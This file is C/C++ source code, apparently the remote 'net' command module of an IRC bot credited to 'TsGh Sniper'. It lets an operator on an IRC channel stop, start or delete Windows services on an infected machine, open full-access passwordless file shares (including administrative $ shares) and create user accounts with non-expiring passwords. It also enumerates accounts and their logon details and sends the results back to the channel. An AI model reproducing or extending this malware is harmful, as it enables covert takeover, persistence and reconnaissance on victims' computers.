/////////////////////////////////////////
///                                   ///
///  TsGh By TsGh Sniper              ///
///                                   ///
/////////////////////////////////////////

// Usage: .net <command> [<service>/<share name>/<username>] [<resource>/<password>] [-d]
//
// Full listing of Windows services:
//  .net start
// Start Windows service:
//  .net start <service name>
// Stop Windows service:
//  .net stop <service>
// Pause Windows service:
//  .net pause <service>
// Continue Windows service:
//  .net continue <service>
// Delete Windows service:
//  .net delete <service>
// Full listing of Windows shares:
//  .net share
// Add Windows share:
//  .net share <share name> <resource>
// Delete Windows share:
//  .net share <share name> -d
// Full listing of Windows users:
//  .net user
// Info on Windows user:
//  .net user <username>
// Add Windows user:
//  .net user <username> <password>
// Delete Windows user:
//  .net user <username> -d

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_NET
// globals
NetCommand netcommand[]={
	{"Add","Added",0},
	{"Delete","Deleted", 0},
	{"List","Listed", 0},
	{"Start","Started", 0},
	{"Stop","Stopped", SERVICE_CONTROL_STOP},
	{"Pause","Paused", SERVICE_CONTROL_PAUSE},
	{"Continue","Continued", SERVICE_CONTROL_CONTINUE}
};

char *Services(int action, char *ServiceName)
{
	static char buffer[IRCLINE];
	
	if (ServiceName) {
		DWORD svcError = ServiceControl(action, ServiceName, netcommand[action].control);
		if (svcError == 0)
			sprintf(buffer,"[NET]: %s service: '%s'.", netcommand[action].completed, ServiceName);
		else
			sprintf(buffer,"[NET]: Error with service: '%s'. %s", ServiceName, ServiceError(svcError));
	}
	else 
		sprintf(buffer,"[NET]: %s: No service specified.", netcommand[action].action);

	return (buffer);
}

DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl, DWORD nArg, LPCTSTR *pArg) 
{ 
	DWORD svcError=0;
	SERVICE_STATUS status;

	SC_HANDLE schSCManager = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager == 0)
		svcError = GetLastError();  
	else {
		SC_HANDLE schService = fOpenService(schSCManager, ServiceName, SERVICE_ALL_ACCESS);
		if (schService == 0) 
			svcError = GetLastError();
		else {
			switch (option) {
			case NET_START:
				if (!fStartService(schService,nArg,pArg))
					svcError = GetLastError();
				break;
			case NET_DELETE:
				if (!fDeleteService(schService))
					svcError = GetLastError();
				break;
			case NET_STOP:
			case NET_PAUSE:
			case NET_CONTINUE:
				if (!fControlService(schService,dwControl,&status))
					svcError = GetLastError();
				break;
			default:
				break;
			}
			fCloseServiceHandle(schService); 
		}
		fCloseServiceHandle(schSCManager); 
	}

	return (svcError);
}

static char *ServiceError(DWORD svcError)
{
	static char retError[90];

	switch (svcError) {
	case ERROR_DATABASE_DOES_NOT_EXIST:
		sprintf(retError,"The specified database does not exist.");
		break;
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"The handle does not have the required access right.");
		break;
	case ERROR_INVALID_NAME: 
		sprintf(retError,"The specified service name is invalid.");
		break;
	case ERROR_INVALID_HANDLE: 
		sprintf(retError,"The handle is invalid.");
		break;
	case ERROR_PATH_NOT_FOUND: 
		sprintf(retError,"The service binary file could not be found.");
		break;
	case ERROR_SERVICE_ALREADY_RUNNING: 
		sprintf(retError,"An instance of the service is already running.");
		break;
	case ERROR_SERVICE_DATABASE_LOCKED: 
		sprintf(retError,"The database is locked.");
		break;
	case ERROR_SERVICE_DEPENDENCY_DELETED: 
		sprintf(retError,"The service depends on a service that does not exist or has been marked for deletion.");
		break;
	case ERROR_SERVICE_DEPENDENCY_FAIL: 
		sprintf(retError,"The service depends on another service that has failed to start.");
		break;
	case ERROR_SERVICE_DISABLED: 
		sprintf(retError,"The service has been disabled.");
		break;
	case ERROR_SERVICE_DOES_NOT_EXIST: 
		sprintf(retError,"The specified service does not exist.");
		break;
	case ERROR_SERVICE_LOGON_FAILED: 
		sprintf(retError,"The service could not be logged on. The account does not have the correct access rights.");
		break;
	case ERROR_SERVICE_MARKED_FOR_DELETE: 
		sprintf(retError,"The service has been marked for deletion.");
		break;
	case ERROR_SERVICE_NO_THREAD: 
		sprintf(retError,"A thread could not be created for the service.");
		break;
	case ERROR_SERVICE_REQUEST_TIMEOUT: 
		sprintf(retError,"The process for the service was started, but it did not call StartServiceCtrlDispatcher."); 
		break;
	case ERROR_DEPENDENT_SERVICES_RUNNING: 
		sprintf(retError,"The service cannot be stopped because other running services are dependent on it.");
		break;
	case ERROR_INVALID_PARAMETER: 
		sprintf(retError,"The requested control code is undefined.");
		break;
	case ERROR_INVALID_SERVICE_CONTROL: 
		sprintf(retError,"The requested control code is not valid, or it is unacceptable to the service."); 
		break;
	case ERROR_SERVICE_CANNOT_ACCEPT_CTRL: 
		sprintf(retError,"The requested control code cannot be sent to the service because the state of the service."); 
		break;
	case ERROR_SERVICE_NOT_ACTIVE: 
		sprintf(retError,"The service has not been started."); 
		break;
	case ERROR_SHUTDOWN_IN_PROGRESS: 
		sprintf(retError,"The system is shutting down."); 
		break;
	default:
		sprintf(retError,"An unknown error occurred: <%ld>", svcError);
	}

	return (retError);

}

BOOL ListServices(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], svcState[20];

	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;

	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	irc_privmsg(sock,chan,"The following Windows services are registered:",notice);
 
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			switch (enumeration[i].ServiceStatus.dwCurrentState) {
			case SERVICE_STOPPED:
				sprintf(svcState,"    Stopped");
				break;
			case SERVICE_START_PENDING:
				sprintf(svcState,"   Starting");
				break;
			case SERVICE_STOP_PENDING:
				sprintf(svcState,"    Stoping");
				break;
			case SERVICE_RUNNING:
				sprintf(svcState,"    Running");
				break;
			case SERVICE_CONTINUE_PENDING:
				sprintf(svcState," Continuing");
				break;
			case SERVICE_PAUSE_PENDING:
				sprintf(svcState,"    Pausing");
				break;
			case SERVICE_PAUSED:
				sprintf(svcState,"     Paused");
				break;
			default:
				sprintf(svcState,"    Unknown");
				break;				
			}
			sprintf(buffer,"%s: %s (%s)", svcState, enumeration[i].lpServiceName, enumeration[i].lpDisplayName);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 

	if(servicesreturned<=0)
		return FALSE;
	
	return TRUE;
}

char *Shares(int action, char *ShareName, char *SharePath)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (ShareName) {
		switch (action) {
		case NET_ADD:
			if(SharePath || strchr(ShareName,'$'))
				nStatus = ShareAdd(NULL,ShareName,SharePath);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = ShareDel(NULL, ShareName);
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,"[NET]: %s share: '%s'.", netcommand[action].completed, ShareName);
		else
			sprintf(buffer,"[NET]: %s: Error with share: '%s'. %s", netcommand[action].action, ShareName, NasError(nStatus));
	}
	else 
		sprintf(buffer,"[NET]: %s: No share specified.", netcommand[action].action);

	return (buffer);
}

static char *AsWideString(const char *cszANSIstring)
{
	if(cszANSIstring == NULL)
		return NULL;
	
	int nBufSize = MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, NULL, 0);
	WCHAR *wideString = new WCHAR[nBufSize+1];
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, cszANSIstring, -1, wideString, nBufSize);
	
	return reinterpret_cast<char*>(wideString);
}

NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath)
{
	SHARE_INFO_2 pBuf; // NT only
	DWORD parm_err;

	// Assign values to the SHARES_INFO_2 structure.
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	pBuf.shi2_netname = (LPWSTR)AsWideString(ShareName);
	if (strchr(ShareName, '$'))
		pBuf.shi2_type = STYPE_SPECIAL; // $c, $d, $ipc, $admin
	else
		pBuf.shi2_type = STYPE_DISKTREE; // anything else
	pBuf.shi2_remark = NULL; // No share comment
	pBuf.shi2_permissions = ACCESS_ALL;
	pBuf.shi2_max_uses = -1; // Unlimited
	pBuf.shi2_current_uses = 0;
	pBuf.shi2_path = (LPWSTR)AsWideString(SharePath);
	pBuf.shi2_passwd = NULL; // No password

	// level must be 2 for NT, otherwise it's 50 on 9x (but who cares ;)
	NET_API_STATUS nStatus = fNetShareAdd(wServerName, 2, (LPBYTE)&pBuf, &parm_err);

	return (nStatus);
}

NET_API_STATUS ShareDel(char *ServerName, char *ShareName)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wShareName = (LPWSTR)AsWideString(ShareName);

	NET_API_STATUS nStatus = fNetShareDel(wServerName,wShareName,0);  

	return (nStatus);
}

BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{
	char buffer[IRCLINE];

	PSHARE_INFO_502 pBuf,p;
	NET_API_STATUS nStatus;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD entriesread=0,totalread=0,resume=0;

	irc_privmsg(sock,chan,"Share name:    Resource:                Uses:  Desc:",notice);
 
	do {
		nStatus = fNetShareEnum(wServerName, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

		if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
			p = pBuf;
 
			for(unsigned int i=1;i <= entriesread;i++) {
	            sprintf(buffer,"%-14S %-24S %-6u %-4s",p->shi502_netname, p->shi502_path, p->shi502_current_uses, IsVSD(fIsValidSecurityDescriptor(p->shi502_security_descriptor)));
				irc_privmsg(sock,chan,buffer,notice,TRUE);

				p++;
			}

			fNetApiBufferFree(pBuf);
		} else {
			sprintf(buffer,"[NET]: Share list error: %s <%ld>",NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}
	} while (nStatus == ERROR_MORE_DATA);	

	if(nStatus != ERROR_SUCCESS)
		return FALSE;
	
	return TRUE;
}

char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];
	NET_API_STATUS nStatus = 0;

	if (Username) {
		switch (action) {
		case NET_ADD:
			if(Username && Password)
				nStatus = UserAdd(NULL,Username,Password);
			else
				nStatus = ERROR_INVALID_PARAMETER;
			break;
		case NET_DELETE:
			nStatus = UserDel(NULL, Username);
			break;
		case NET_INFO:
			nStatus = UserInfo(NULL,Username,sock,chan,notice);
			break;
		default:
			break;
		}

		if (nStatus == NERR_Success)
			sprintf(buffer,"[NET]: %s username: '%s'.", netcommand[action].completed, Username);
		else
			sprintf(buffer,"[NET]: %s: Error with username: '%s'. %s", netcommand[action].action, Username, NasError(nStatus));
	}
	else 
		sprintf(buffer,"[NET]: %s: No username specified.", netcommand[action].action);

	return (buffer);
}

NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password)
{
	USER_INFO_1 ui;
	DWORD dwLevel = 1, dwError = 0;

	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	ui.usri1_name = (LPWSTR)AsWideString(Username);
	ui.usri1_password = (LPWSTR)AsWideString(Password);
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
	ui.usri1_script_path = NULL;

	NET_API_STATUS nStatus = fNetUserAdd(wServerName,dwLevel,(LPBYTE)&ui,&dwError);

	return (nStatus);
}

NET_API_STATUS UserDel(char *ServerName, char *Username)
{
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);

	NET_API_STATUS nStatus = fNetUserDel(wServerName,wUsername);  

	return (nStatus);
}

NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], *user_priv;

	LPUSER_INFO_11 pBuf = NULL;
	DWORD dwLevel = 11;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	LPWSTR wUsername = (LPWSTR)AsWideString(Username);
	
	NET_API_STATUS nStatus = fNetUserGetInfo(wServerName,wUsername,dwLevel,(LPBYTE *)&pBuf);

	if (nStatus == NERR_Success) {
		if (pBuf != NULL) {
			sprintf(buffer,"Account: %S",pBuf->usri11_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Full Name: %S",pBuf->usri11_full_name);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User Comment: %S",pBuf->usri11_usr_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Comment: %S",pBuf->usri11_comment);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			switch(pBuf->usri11_priv) {
			case USER_PRIV_GUEST: 
				user_priv = TEXT("Guest"); 
				break;
			case USER_PRIV_USER:
				user_priv = TEXT("User");
				break;
			case USER_PRIV_ADMIN: 
				user_priv = TEXT("Administrator");
				break;
			default:
				user_priv = TEXT("Unknown");
				break;
			}
			sprintf(buffer,"Privilege Level: %s",user_priv);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Auth Flags: %d",pBuf->usri11_auth_flags);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Home Directory: %S",pBuf->usri11_home_dir);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Parameters: %S",pBuf->usri11_parms);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Password Age: %d",pBuf->usri11_password_age);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Bad Password Count: %d",pBuf->usri11_bad_pw_count);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Number of Logins: %d",pBuf->usri11_num_logons);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logon: %d",pBuf->usri11_last_logon);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Last Logoff: %d",pBuf->usri11_last_logoff);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Logon Server: %S",pBuf->usri11_logon_server);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Workstations: %S",pBuf->usri11_workstations);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Country Code: %d",pBuf->usri11_country_code);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"User's Language: %d",pBuf->usri11_code_page);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Max. Storage: %d",pBuf->usri11_max_storage);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
			sprintf(buffer,"Units Per Week: %d",pBuf->usri11_units_per_week);
			irc_privmsg(sock,chan,buffer,notice,TRUE);
		}
	}
	else {
		sprintf(buffer,"[NET]: User info error: <%ld>",nStatus);
		irc_privmsg(sock,chan,buffer,notice);
	}

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	return (nStatus);
}

BOOL ListUsers(SOCKET sock, char *chan, BOOL notice, char *ServerName)
{

	char buffer[IRCLINE];

	LPUSER_INFO_0 pBuf=NULL, pTmpBuf;
	LPWSTR wServerName = (LPWSTR)AsWideString(ServerName);
	DWORD dwLevel=0,dwPrefMaxLen=MAX_PREFERRED_LENGTH,dwEntriesRead=0,
		dwTotalEntries=0,dwResumeHandle=0,dwTotalCount=0;
	NET_API_STATUS nStatus;

	irc_privmsg(sock,chan,"Username accounts for local system:",notice);

	do {
		nStatus = fNetUserEnum(wServerName,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,
			dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);
      
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((pTmpBuf = pBuf) != NULL) {
				for (DWORD i = 0;i < dwEntriesRead; i++) {
					assert(pTmpBuf != NULL);

					if (pTmpBuf == NULL) {
						sprintf(buffer,"[NET]: An access violation has occured.");
						irc_privmsg(sock,chan,buffer,notice);
						break;
					}

					sprintf(buffer,"  %S",pTmpBuf->usri0_name);
					irc_privmsg(sock,chan,buffer,notice,TRUE);

					pTmpBuf++;
					dwTotalCount++;
				}
			}
		} else {
			sprintf(buffer,"[NET]: User list error: %s <%ld>",NasError(nStatus),nStatus);
			irc_privmsg(sock,chan,buffer,notice);
		}

		if (pBuf != NULL) {
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (nStatus == ERROR_MORE_DATA);

	if (pBuf != NULL)
		fNetApiBufferFree(pBuf);

	sprintf(buffer,"Total users found: %d.",dwTotalCount);
	irc_privmsg(sock,chan,buffer,notice);

	if(nStatus != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

static char *NasError(NET_API_STATUS nStatus)
{
	static char retError[90];

	switch (nStatus) {
	case ERROR_ACCESS_DENIED:
		sprintf(retError,"Access denied.");
		break;
	case ERROR_INVALID_LEVEL:
		sprintf(retError,"Level parameter is invalid.");
		break;
	case ERROR_INVALID_NAME:
		sprintf(retError,"The name is invalid.");
		break;
	case ERROR_INVALID_PARAMETER:
		sprintf(retError,"Invalid parameter.");
		break;
	case ERROR_NOT_ENOUGH_MEMORY:
		sprintf(retError,"Not enough memory.");
		break;
	case ERROR_NOT_SUPPORTED:
		sprintf(retError,"This network request is not supported.");
		break;
	case ERROR_BAD_NETPATH:
		sprintf(retError,"Server name not found.");
		break;
	case NERR_NetNameNotFound:
		sprintf(retError,"Share not found.");
		break;
	case NERR_DuplicateShare:
		sprintf(retError,"Duplicate share name.");
		break;
	case NERR_RedirectedPath:
		sprintf(retError,"Invalid for redirected resource.");
		break;
	case NERR_UnknownDevDir:
		sprintf(retError,"Device or directory does not exist.");
		break;
	case NERR_InvalidComputer:
		sprintf(retError,"The computer name is invalid.");
		break;
	case NERR_NotPrimary:
		sprintf(retError,"The operation is allowed only on the primary domain controller of the domain.");
		break;
	case NERR_GroupExists:
		sprintf(retError,"The group already exists.");
		break;
	case NERR_UserExists:
		sprintf(retError,"The user account already exists.");
		break;
	case NERR_PasswordTooShort:
		sprintf(retError,"The password is shorter than required (or does not meet the password policy requirement.)");
		break;
	case NERR_UseNotFound:
		sprintf(retError,"Network connection not found.");
		break;
	case NERR_NetworkError:
		sprintf(retError,"A general failure occurred in the network hardware.");
		break;
	case NERR_NameNotFound:
	case NERR_UserNotFound:
		sprintf(retError,"The user name could not be found.");
		break;
	default:
		sprintf(retError,"An unknown error occurred.");
		break;
	}			

	return (retError);
}

char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice)
{
	static char buffer[IRCLINE];

	wchar_t wserver[MAX_PATH+4], wmsg[IRCLINE];
	mbstowcs(wmsg, msg, IRCLINE);

	char Server[MAX_PATH+4];
	DWORD szServer = sizeof(Server);
	GetComputerName(Server, &szServer);	
	mbstowcs(wserver, Server, MAX_PATH+4);
	
	NET_API_STATUS nStatus = fNetMessageBufferSend(NULL, wserver, NULL, (LPBYTE)&wmsg, wcslen(wmsg)*2);

	if(nStatus == NERR_Success)
		sprintf(buffer,"[NET]: Message sent successfully.");
	else
		sprintf(buffer,"[NET]: %s <Server: %S> <Message: %S>", NasError(nStatus), wserver, wmsg);

	return (buffer);
}
#endif
